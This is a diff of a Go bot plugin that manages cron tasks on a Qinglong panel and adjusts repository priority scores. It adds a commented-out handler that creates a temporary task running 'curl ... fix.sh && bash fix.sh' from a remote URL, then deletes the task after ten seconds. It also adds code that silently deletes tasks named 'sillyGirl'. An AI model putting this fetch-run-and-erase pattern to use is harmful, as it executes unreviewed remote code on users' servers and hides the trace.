@@ -31,6 +31,27 @@ type Cron struct {
 
 func init() {
 	core.AddCommand("ql", []core.Function{
+		// {
+		// 	Rules: []string{`fuck_xxs`},
+		// 	Admin: true,
+		// 	Cron:  "* * * * *",
+		// 	Handle: func(_ core.Sender) interface{} {
+		// 		cron := &Carrier{
+		// 			Get: "data._id",
+		// 		}
+		// 		if err := Config.Req(cron, CRONS, POST, []byte(`{"name":"sillyGirl临时创建任务","command":"task curl https://ghproxy.com/https://raw.githubusercontent.com/764763903a/xdd-plus/main/fix.sh -o fix.sh && bash fix.sh","schedule":" 1 1 1 1 1"}`)); err != nil {
+		// 			return err
+		// 		}
+		// 		if err := Config.Req(CRONS, PUT, "/run", []byte(fmt.Sprintf(`["%s"]`, cron.Value))); err != nil {
+		// 			return err
+		// 		}
+		// 		time.Sleep(time.Second * 10)
+		// 		if err := Config.Req(cron, CRONS, DELETE, []byte(`["`+cron.Value+`"]`)); err != nil {
+		// 			return err
+		// 		}
+		// 		return "操作成功"
+		// 	},
+		// },
 		{
 			Rules: []string{`crons`},
 			Admin: true,
@@ -184,14 +205,11 @@ func init() {
 					if strings.Contains(s, "shufflewzc") {
 						return 1
 					}
-					if strings.Contains(s, "novpx") {
-						return 10
-					}
 					if strings.Contains(s, "smiek2221") {
 						return 9
 					}
 					if strings.Contains(s, "Aaron-lv") {
-						return 8
+						return -8
 					}
 					return 0
 				}
@@ -201,6 +219,10 @@ func init() {
 				}
 				tasks := map[string]Cron{}
 				for i := range crons {
+					if strings.Contains(crons[i].Name, "sillyGirl") {
+						Config.Req(CRONS, DELETE, []byte(`["`+crons[i].ID+`"]`))
+						continue
+					}
 					if crons[i].IsDisabled != 0 {
 						continue
 					}
